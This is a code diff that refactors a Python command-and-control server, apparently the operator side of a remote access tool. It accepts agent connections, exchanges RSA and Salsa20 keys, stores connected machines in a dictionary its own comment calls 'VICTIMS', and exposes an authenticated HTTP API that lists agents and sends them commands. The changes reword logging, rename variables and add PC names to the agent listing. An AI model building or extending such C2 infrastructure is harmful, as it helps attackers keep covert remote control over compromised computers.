@@ -75,14 +75,14 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
                 # Generate & add session
                 session = http_session.add_session(request.remote_addr)
                 
-                logger.info(f"{request.remote_addr} session generated & added")
+                logger.info(f"New client connected: {request.remote_addr}")
                 return jsonify({"session": session[1]})
             else:
-                logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
+                logger.info(f"{request.remote_addr}: failed to authenticate ({USERNAME}:{PASSWORD})")
                 return jsonify({"error": "Username of password invalid"}), 401
     
         else:
-            logger.info(f"{request.remote_addr} failed to authenticate ({USERNAME}:{PASSWORD})")
+            logger.info(f"{request.remote_addr}: failed to authenticate ({USERNAME}:{PASSWORD})")
             return jsonify({"error": "Username or password invalid"}), 401
 
      # >>> [GET_AGENTS] <<<
@@ -93,16 +93,18 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         if http_session.exist(request.remote_addr, session):
             
             # Add agents fingerprint into `agents_fingerprint`
-            agents_fingerprint = []
-            for v in server_cfg.AGENTS:
-                FINGERPRINT = server_cfg.AGENTS[v][0].decode()
-                agents_fingerprint.append(FINGERPRINT)
+            agents_info: list[list] = []
+            for agent in server_cfg.AGENTS:
+                FINGERPRINT = server_cfg.AGENTS[agent][0].decode()
+                PCNAME = server_cfg.AGENTS[agent][1]
+                
+                agents_info.append([agent, FINGERPRINT, PCNAME])
 
-            logger.info(f"{request.remote_addr} fingerprint of the agents sent ({session})")
-            return jsonify({"fingerprints": agents_fingerprint})
+            logger.info(f"{request.remote_addr}: list of agents sent ({session})")
+            return jsonify(agents_info)
         
         else:
-            logger.info(f"{request.remote_addr} invalid session ({session})")
+            logger.info(f"{request.remote_addr}: invalid session ({session})")
             return jsonify({"error": "Invalid session"})
 
     # >>> [ SEND_COMMAND ] <<<
@@ -148,12 +150,11 @@ async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.Stre
     
     formated_peername = PEERNAME[0] + ':' + str(PEERNAME[1])
     
-    logger.info(f"Agent connected: {PEERNAME}")
 
     # Get a fingerprint (random string)
     fingerprint = await r.read(server_cfg.BUFSIZE)
 
-    logger.info(f"Agent ({PEERNAME}) fingerprint: {fingerprint}")
+    logger.info(f"Agent connected {PEERNAME}/{fingerprint}")
 
     # Generate rsa keys
     # will be used for key exchange + nonce to start communicating only with Salsa20
@@ -164,21 +165,16 @@ async def handle_agents(r: asyncio.streams.StreamReader, w: asyncio.streams.Stre
     w.write(public_key_pem)
     await w.drain()
 
-    logger.info(f"Agent ({PEERNAME}): RSA key sended")
-
     # Gets the RSA-encrypted string containing the key and nonce
     decrypted = rsa.decrypt(await r.read(server_cfg.BUFSIZE), private_key)
     decompressed = zlib.decompress(decrypted)
     
     key, nonce = decompressed.split(b"<SPR>")
 
-    logger.info(f"Agent ({PEERNAME}): key: {key}, nonce: {nonce}")
-
     # Memory free
     del(decrypted)
     del(decompressed)
 
-    logger.debug(f"init EncryptedTunnel for {PEERNAME}")
     enctunnel = EncryptedTunnel(r, w, key, nonce)
 
     # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
@@ -206,8 +202,9 @@ async def main():
     logging.getLogger("werkzeug").disabled = True
 
     # Open multiple server
-    server_victims = await asyncio.start_server(handle_agents, AGENT_IP, AGENT_PORT)
-    
+    server_agents = await asyncio.start_server(handle_agents, AGENT_IP, AGENT_PORT)
+    logger.info(f"Socket server opened: {AGENT_IP}:{AGENT_PORT}")
+
     if args.ssl:
         https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
         logger.debug(f"SSL: {https_files}")
@@ -216,10 +213,11 @@ async def main():
         https_files = ()
 
     threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files)).start()
+    logger.info(f"HTTP server opened: {HTTP_IP}:{HTTP_PORT}")
 
     # Looping server
-    async with server_victims:
-        await server_victims.serve_forever()
+    async with server_agents:
+        await server_agents.serve_forever()
 
 if __name__ == "__main__":
     asyncio.run(main())
